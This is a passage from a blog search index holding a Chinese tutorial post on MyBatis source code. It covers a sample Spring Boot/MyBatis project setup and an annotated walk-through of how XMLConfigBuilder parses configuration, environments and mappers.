<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MyBatis源码分析</title>
    <url>/2023/09/03/$$MyBatis%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="1-项目环境准备"><a href="#1-项目环境准备" class="headerlink" title="1. 项目环境准备"></a>1. 项目环境准备</h1><h2 id="1-1-pox-xml"><a href="#1-1-pox-xml" class="headerlink" title="1.1 pox.xml"></a>1.1 pox.xml</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.zhifei<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-src-analysis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-2-mybatis-config-xml"><a href="#1-2-mybatis-config-xml" class="headerlink" title="1.2 mybatis-config.xml"></a>1.2 mybatis-config.xml</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;properties resource=&quot;org/mybatis/example/config.properties&quot;&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--二级缓存的开启（默认关闭，建议关闭）--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--SESSION(默认)/STATEMENT，一级缓存，STATEMENT：每次查询完都清空，或者在select标签上加 flushCache=&quot;true&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;setting name=&quot;localCacheScope&quot; value=&quot;STATEMENT&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logPrefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;customizing-log &quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;dev&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;dev&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--这里可以通过指定resource/url/class，或者使用package标签指定，优先级：package &gt; resource &gt; url &gt; class --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mapper/BookMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-3-Book-java"><a href="#1-3-Book-java" class="headerlink" title="1.3 Book.java"></a>1.3 Book.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/3/26 9:26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Book</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getCreateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCreateTime</span><span class="params">(Date createTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getUpdateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpdateTime</span><span class="params">(Date updateTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateTime = updateTime;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-4-BookMapper-java"><a href="#1-4-BookMapper-java" class="headerlink" title="1.4 BookMapper.java"></a>1.4 BookMapper.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.zhifei.entity.Book;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/3/26 9:36</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BookMapper</span> &#123;</span><br><span class="line">    Book <span class="title function_">getById</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-5-BookMapper-xml"><a href="#1-5-BookMapper-xml" class="headerlink" title="1.5 BookMapper.xml"></a>1.5 BookMapper.xml</h2><p>resources&#x2F;mapper下创建BookMapper.xml文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.zhifei.mapper.BookMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getById&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.lang.Integer&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.zhifei.entity.Book&quot;</span> <span class="attr">flushCache</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        select id, create_time AS createTime, update_time AS updateTime</span><br><span class="line">        from t_book where id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-6-数据库表"><a href="#1-6-数据库表" class="headerlink" title="1.6 数据库表"></a>1.6 数据库表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_book`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `create_time` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> InnoDB <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `t_book` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;2021-03-27 16:23:17&#x27;</span>, <span class="string">&#x27;2021-03-27 16:23:19&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="1-7-main方法"><a href="#1-7-main方法" class="headerlink" title="1.7 main方法"></a>1.7 main方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.zhifei.entity.Book;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/3/24 17:07</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        jdbc();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line">        <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> sqlSession.selectOne(<span class="string">&quot;com.zhifei.mapper.BookMapper.getById&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Book</span> <span class="variable">book2</span> <span class="operator">=</span> sqlSession.selectOne(<span class="string">&quot;com.zhifei.mapper.BookMapper.getById&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        System.out.println(book);</span><br><span class="line">        System.out.println(book2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用底层jdbc实现数据库操作</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">jdbc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://127.0.0.1/test&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">            connection.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line">            statement = connection.prepareStatement(<span class="string">&quot;INSERT INTO t_book (`id`, `create_time`, `update_time`) VALUES (&#x27;11&#x27;, &#x27;2021-03-27 16:23:17&#x27;, &#x27;2021-03-27 16:23:17&#x27;)&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> statement.executeUpdate();</span><br><span class="line">            System.out.println(<span class="string">&quot;插入了&quot;</span> + i + <span class="string">&quot;条记录&quot;</span>);</span><br><span class="line">            connection.commit();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            connection.rollback();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (statement != <span class="literal">null</span>) &#123;</span><br><span class="line">                statement.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">                connection.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-源码分析"><a href="#2-源码分析" class="headerlink" title="2. 源码分析"></a>2. 源码分析</h1><h2 id="2-1-SqlSessionFactory的创建"><a href="#2-1-SqlSessionFactory的创建" class="headerlink" title="2.1 SqlSessionFactory的创建"></a>2.1 SqlSessionFactory的创建</h2><p>通过XMLConfigBuilder读取mybatis配置信息到Configuration</p>
<h3 id="2-1-1-调用链"><a href="#2-1-1-调用链" class="headerlink" title="2.1.1 调用链"></a>2.1.1 调用链</h3><p><img src="/../img/202205121041414.png" alt="image-20220512104059283"></p>
<p>完成了读取mybatis配置信息到XMLConfigBuilder的Configuration成员变量中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这里说的根节点均是指configuration节点</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseConfiguration</span><span class="params">(XNode root)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// issue #117 read properties first</span></span><br><span class="line">    <span class="comment">// 读取根节点下的properties节点</span></span><br><span class="line">    propertiesElement(root.evalNode(<span class="string">&quot;properties&quot;</span>));</span><br><span class="line">    <span class="comment">// 读取根节点下的settings节点，并校验是否能识别对应的setting属性（Configuration.class中的成员）</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">settings</span> <span class="operator">=</span> settingsAsProperties(root.evalNode(<span class="string">&quot;settings&quot;</span>));</span><br><span class="line">    <span class="comment">// 加载自定义的vfs(虚拟文件系统)</span></span><br><span class="line">    loadCustomVfs(settings);</span><br><span class="line">    <span class="comment">// 加载自定义的日志实现</span></span><br><span class="line">    loadCustomLogImpl(settings);</span><br><span class="line">    <span class="comment">// TypeAliasRegistry进行别名注册</span></span><br><span class="line">    typeAliasesElement(root.evalNode(<span class="string">&quot;typeAliases&quot;</span>));</span><br><span class="line">    <span class="comment">// 添加mybatis拦截器</span></span><br><span class="line">    pluginElement(root.evalNode(<span class="string">&quot;plugins&quot;</span>));</span><br><span class="line">    <span class="comment">// 指定对象工厂</span></span><br><span class="line">    objectFactoryElement(root.evalNode(<span class="string">&quot;objectFactory&quot;</span>));</span><br><span class="line">    <span class="comment">// 指定对象工厂的包装器</span></span><br><span class="line">    objectWrapperFactoryElement(root.evalNode(<span class="string">&quot;objectWrapperFactory&quot;</span>));</span><br><span class="line">    <span class="comment">// 指定反射工厂</span></span><br><span class="line">    reflectorFactoryElement(root.evalNode(<span class="string">&quot;reflectorFactory&quot;</span>));</span><br><span class="line">    <span class="comment">// 把settings中的部分属性设置给Configuration</span></span><br><span class="line">    settingsElement(settings);</span><br><span class="line">    <span class="comment">// read it after objectFactory and objectWrapperFactory issue #631</span></span><br><span class="line">    <span class="comment">// 读取环境配置，实际上可分为（dev,test,prd等环境）</span></span><br><span class="line">    environmentsElement(root.evalNode(<span class="string">&quot;environments&quot;</span>));</span><br><span class="line">    <span class="comment">// 配置数据库id供应方</span></span><br><span class="line">    databaseIdProviderElement(root.evalNode(<span class="string">&quot;databaseIdProvider&quot;</span>));</span><br><span class="line">    <span class="comment">// 配置类型转换器</span></span><br><span class="line">    typeHandlerElement(root.evalNode(<span class="string">&quot;typeHandlers&quot;</span>));</span><br><span class="line">    <span class="comment">// 读取mapper.xml配置</span></span><br><span class="line">    mapperElement(root.evalNode(<span class="string">&quot;mappers&quot;</span>));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BuilderException</span>(<span class="string">&quot;Error parsing SQL Mapper Configuration. Cause: &quot;</span> + e, e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-1-2-2-1-1中的方法分析"><a href="#2-1-2-2-1-1中的方法分析" class="headerlink" title="2.1.2 #2.1.1中的方法分析"></a>2.1.2 #2.1.1中的方法分析</h3><h4 id="environmentsElement方法"><a href="#environmentsElement方法" class="headerlink" title="environmentsElement方法"></a>environmentsElement方法</h4><p>加载配置文件中id属性值与environments中的default属性值一致的environment元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">environmentsElement</span><span class="params">(XNode context)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="keyword">if</span> (context != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (environment == <span class="literal">null</span>) &#123;</span><br><span class="line">      environment = context.getStringAttribute(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (XNode child : context.getChildren()) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (isSpecifiedEnvironment(id)) &#123;</span><br><span class="line">        <span class="comment">// 事务工厂</span></span><br><span class="line">        <span class="type">TransactionFactory</span> <span class="variable">txFactory</span> <span class="operator">=</span> transactionManagerElement(child.evalNode(<span class="string">&quot;transactionManager&quot;</span>));</span><br><span class="line">        <span class="comment">// 数据源工厂</span></span><br><span class="line">        <span class="type">DataSourceFactory</span> <span class="variable">dsFactory</span> <span class="operator">=</span> dataSourceElement(child.evalNode(<span class="string">&quot;dataSource&quot;</span>));</span><br><span class="line">        <span class="comment">// 数据源</span></span><br><span class="line">        <span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> dsFactory.getDataSource();</span><br><span class="line">        <span class="comment">// 通过事务工厂、数据源创建环境Environment</span></span><br><span class="line">        Environment.<span class="type">Builder</span> <span class="variable">environmentBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Environment</span>.Builder(id)</span><br><span class="line">            .transactionFactory(txFactory)</span><br><span class="line">            .dataSource(dataSource);</span><br><span class="line">        configuration.setEnvironment(environmentBuilder.build());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="mapperElement方法"><a href="#mapperElement方法" class="headerlink" title="mapperElement方法"></a>mapperElement方法</h4><p>可以通过指定mapper元素的resource&#x2F;url&#x2F;class属性，或者使用package标签指定mapper.xml，优先级：package &gt; resource &gt; url &gt; class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">mapperElement</span><span class="params">(XNode parent)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (XNode child : parent.getChildren()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&quot;package&quot;</span>.equals(child.getName())) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">mapperPackage</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        configuration.addMappers(mapperPackage);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">mapperClass</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (resource != <span class="literal">null</span> &amp;&amp; url == <span class="literal">null</span> &amp;&amp; mapperClass == <span class="literal">null</span>) &#123;</span><br><span class="line">          ErrorContext.instance().resource(resource);</span><br><span class="line">          <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> 